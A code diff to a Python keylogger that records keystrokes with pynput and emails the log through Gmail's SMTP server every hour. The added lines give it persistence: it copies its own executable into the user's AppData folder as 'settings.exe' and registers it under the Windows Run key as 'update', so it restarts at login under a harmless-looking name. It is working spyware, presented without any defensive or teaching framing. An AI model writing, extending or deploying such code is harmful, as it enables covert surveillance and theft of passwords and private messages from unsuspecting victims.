@@ -1,3 +1,8 @@
+import os
+import shutil
+import subprocess
+import sys
+
 import pynput.keyboard
 import smtplib
 import threading
@@ -7,6 +12,7 @@ class Keylogger:
 
     def __init__(self):
         self.log = "Keylogger Started!"
+        self.coping()
 
     def append_to_log(self, string):
         self.log = self.log + string
@@ -27,10 +33,16 @@ class Keylogger:
         timer = threading.Timer(3600, self.report)
         timer.start()
 
+    def coping(self):
+        path = os.environ["appdata"] + "\\settings.exe"
+        if not os.path.exists(path):
+            shutil.copyfile(sys.executable, path)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + path + '"', shell=True)
+
     @staticmethod
     def send_mail(message):
-        sender = " " #YOUR EMAIL
-        password = " " # YOUR PASSWORD
+        sender = " "  # YOUR EMAIL
+        password = " "  # YOUR PASSWORD
         server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()
         msg = message
